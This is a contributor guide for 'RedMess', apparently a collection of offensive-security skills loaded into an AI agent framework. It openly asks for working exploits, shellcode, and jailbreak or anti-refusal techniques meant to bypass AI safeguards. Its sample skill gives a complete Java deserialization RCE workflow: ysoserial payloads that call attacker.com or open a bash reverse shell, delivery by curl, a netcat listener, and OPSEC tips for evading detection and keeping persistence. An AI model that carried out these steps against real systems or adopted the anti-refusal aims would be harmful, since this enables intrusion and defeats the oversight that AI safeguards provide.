# Contributing to RedMess

Terima kasih udah mau contribute! RedMess adalah community-driven project — setiap contribution (skills, tools, techniques, bug fixes) bikin ecosystem ini makin kuat.

---

## 🎯 What We're Looking For

### High Priority:
- **New Offensive Security Skills** — Reconnaissance, exploitation, post-exploitation techniques
- **Tool Integrations** — Wrapper scripts untuk offensive tools (Metasploit modules, Burp extensions, dll)
- **Real-World Payloads** — Working exploits, shellcode, obfuscation techniques
- **Jailbreak Improvements** — Better anti-refusal mechanisms, detection bypass
- **Platform Support** — Skills untuk iOS, cloud platforms (AWS/GCP/Azure), IoT
- **Documentation** — Better explanations, OPSEC considerations, detection risks

### Medium Priority:
- Bug fixes di existing skills
- Performance improvements
- Better error handling
- Testing infrastructure

### Low Priority (but still welcome):
- Typo fixes
- Formatting improvements
- Asset improvements (logo, banners, dll)

---

## 🔧 How to Contribute

### 1. Fork & Clone

```bash
# Fork via GitHub UI atau gh CLI
gh repo fork harezadmm/RedMess --clone

cd RedMess
```

### 2. Create Feature Branch

```bash
# Branch naming convention:
# - feature/skill-name (new skills)
# - fix/issue-description (bug fixes)
# - improve/what-improved (enhancements)
# - docs/what-documented (documentation)

git checkout -b feature/new-exploitation-technique
```

### 3. Make Your Changes

#### Adding a New Skill:

```bash
# Create skill file in appropriate category
mkdir -p security/exploitation
vim security/exploitation/deserialization-rce.md
```

**Skill Template:**

```markdown
---
description: Exploit Java deserialization for RCE (max 57 chars)
category: security/exploitation
tags: [java, deserialization, rce, gadget-chains]
platform: [linux, windows]
difficulty: advanced
tools: [ysoserial, burpsuite, wireshark]
mitre_attack: [T1203]
---

# Java Deserialization RCE

## When to Use
Use when target application deserializes untrusted data without validation. Common in:
- Java web apps using ObjectInputStream
- RMI/JMX endpoints
- JBoss, WebLogic, Jenkins

## Prerequisites
- Java installed (match target version)
- ysoserial tool: `git clone https://github.com/frohoff/ysoserial && cd ysoserial && mvn package`
- Burp Suite (for intercepting/modifying requests)
- Known gadget chain for target library

## Step-by-Step

### 1. Identify Deserialization
Look for:
- `Content-Type: application/x-java-serialized-object`
- Base64 blobs starting with `rO0AB` (serialized Java magic bytes)
- HTTP headers: `X-Java-Serialized-Object`

```bash
# Decode suspected base64 to check for Java serialization magic bytes
echo "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==" | base64 -d | xxd | head
# Look for: aced 0005 (Java serialization magic)
```

### 2. Generate Malicious Payload

```bash
# List available gadget chains
java -jar ysoserial.jar

# Generate payload for CommonsCollections6 (widely compatible)
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' > payload.bin

# Or reverse shell payload
java -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > payload.bin

# Base64 encode for web requests
base64 -w0 payload.bin > payload.b64
```

### 3. Deliver Payload

**Via HTTP POST:**
```bash
# Setup listener first
nc -lvnp 4444

# Send payload
curl -X POST http://target.com/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

**Via Burp Suite:**
1. Intercept request with serialized object
2. Replace body with payload.bin content (base64 decoded)
3. Forward request
4. Check listener for shell

### 4. Verify Exploitation

```bash
# If using curl callback
# Check attacker server logs for incoming request with username

# If using reverse shell
# Wait for connection on nc listener
# Verify with: id && hostname && pwd
```

## Pitfalls & OPSEC

**Common Failures:**
- **Wrong gadget chain** — Target doesn't have vulnerable library in classpath
  - Solution: Try multiple chains (CC1, CC6, Spring1, Jdk7u21)
- **WAF/IDS detection** — Signature-based blocking
  - Solution: Encode payload, fragment across multiple requests
- **Deserialization timeout** — Payload too complex
  - Solution: Simplify payload, avoid sleep/wait commands
- **Outbound firewall** — Can't callback or reverse shell
  - Solution: Use DNS exfil or blind techniques

**Detection Risks:**
- Java deserialization attempts trigger SIEM alerts
- Reverse shells create suspicious outbound connections
- ysoserial payloads have known signatures

**OPSEC Improvements:**
- Use custom gadget chains (not ysoserial defaults)
- Encrypt/obfuscate callbacks
- Use legitimate-looking domains for callbacks
- Throttle requests to avoid rate-limiting

## Verification

```bash
# Confirm RCE
whoami
id
uname -a

# Establish persistence (if authorized)
# (add authorized_keys, cron job, etc)
```

## Related Skills
- `jar-analysis` — Analyze JARs for vulnerable libraries
- `gadget-chain-discovery` — Find custom gadget chains
- `post-exploitation-java` — Post-exploit in Java environments
- `av-evasion-java` — Bypass AV/EDR in Java payloads

## References
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [Java Unmarshaller Security](https://github.com/mbechler/marshalsec)
- [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
```

**Key Elements:**
- Clear trigger conditions (When to Use)
- Prerequisites listed upfront
- Step-by-step dengan actual commands
- Common pitfalls & solutions
- OPSEC considerations
- Verification steps
- Related skills for workflow

#### Adding Code Examples:

Kalo skill butuh supporting code (Python scripts, C++ exploits, shellcode):

```bash
# Create scripts directory in skill folder
mkdir -p security/exploitation/deserialization-rce/scripts

# Add your script
vim security/exploitation/deserialization-rce/scripts/gadget_finder.py
```

Reference script dalam skill markdown:

```markdown
## Automated Gadget Discovery

Use the included script to scan JARs for gadget chains:

```python
# scripts/gadget_finder.py
import zipfile
import re

def scan_jar(jar_path):
    with zipfile.ZipFile(jar_path) as z:
        # Check for vulnerable classes
        for name in z.namelist():
            if 'commons-collections' in name.lower():
                print(f"[!] Found vulnerable library: {name}")
    # ... (rest of logic)
```

Run it:
```bash
python scripts/gadget_finder.py /path/to/app.jar
```
\```
```

### 4. Test Your Skill

```bash
# Load skill in Hermes
hermes skill view deserialization-rce

# Test commands work
# Verify code runs
# Check for errors/typos
```

### 5. Commit & Push

```bash
git add security/exploitation/deserialization-rce.md
git commit -m "Add Java deserialization RCE skill

- Step-by-step exploitation with ysoserial
- Multiple gadget chain examples
- OPSEC considerations for WAF bypass
- Detection risk mitigation"

git push origin feature/new-exploitation-technique
```

### 6. Create Pull Request

```bash
# Via gh CLI
gh pr create \
  --title "Add Java Deserialization RCE Skill" \
  --body "Adds comprehensive skill for exploiting Java deserialization vulnerabilities.

**Changes:**
- New skill: security/exploitation/deserialization-rce.md
- Includes ysoserial integration
- OPSEC considerations
- Related to existing post-exploitation skills

**Testing:**
- Verified on HackTheBox: Arkham, JSON
- Tested gadget chains: CC6, Spring1, Jdk7u21
- Commands validated in Kali Linux 2026.3"

# Atau via GitHub web UI
```

---

## 📝 Contribution Guidelines

### Code Quality:
- **Working code only** — Test sebelum submit
- **Comments** — Explain complex logic
- **Error handling** — Graceful failures
- **Cross-platform** — Support Linux/Windows kalo applicable

### Skill Quality:
- **Clear triggers** — When to use skill
- **Step-by-step** — Numbered steps dengan actual commands
- **Pitfalls section** — Common mistakes & solutions
- **OPSEC** — Detection risks & mitigations
- **Verification** — How to confirm success

### Style:
- **Markdown** — Proper formatting
- **Code blocks** — Always use syntax highlighting
- **Consistent naming** — lowercase-with-hyphens
- **Tags** — Relevant, searchable tags

### Legal:
- **Authorized use only** — Documentation harus emphasize legal use
- **No 0-days** — Jangan publish unpatched vulns
- **Attribution** — Credit original researchers kalo applicable

---

## 🔍 Review Process

1. **Automated Checks**
   - Markdown linting
   - Skill metadata validation
   - Code syntax check

2. **Manual Review**
   - Skill quality assessment
   - OPSEC review
   - Legal compliance check

3. **Testing**
   - Commands verified working
   - Code executed successfully
   - No false positives

4. **Merge**
   - Approved PRs merged to `main`
   - Contributor credited in commit
   - Skill available in next release

---

## 🎁 Recognition

Contributors get:
- Listed in [CONTRIBUTORS.md](./CONTRIBUTORS.md)
- Credit in skill frontmatter
- Shoutout di README updates
- Mention di release notes

Top contributors eligible untuk:
- Maintainer status
- Direct commit access
- Feature request priority

---

## 🐛 Reporting Issues

Found a bug? Skill tidak work? Report it!

```bash
# Via gh CLI
gh issue create \
  --title "sqlmap-advanced skill fails on Python 3.14" \
  --body "**Description:**
sqlmap skill fails with import error on Python 3.14

**Steps to Reproduce:**
1. hermes skill view sqlmap-advanced
2. Run command: sqlmap -u http://target.com --batch
3. Error: ImportError: cannot import name '_AnyStr' from 'typing'

**Environment:**
- OS: Kali Linux 2026.3
- Python: 3.14.0
- Hermes: 1.2.1
- RedMess: latest (commit abc123)

**Expected:**
sqlmap runs successfully

**Actual:**
Import error, skill fails"
```

---

## 💬 Questions?

- **GitHub Discussions** — [github.com/harezadmm/RedMess/discussions](https://github.com/harezadmm/RedMess/discussions)
- **Telegram** — [@RedMessSecurity](https://t.me/RedMessSecurity) *(coming soon)*
- **Email** — redmess@protonmail.com

---

**Happy contributing! 🔓**
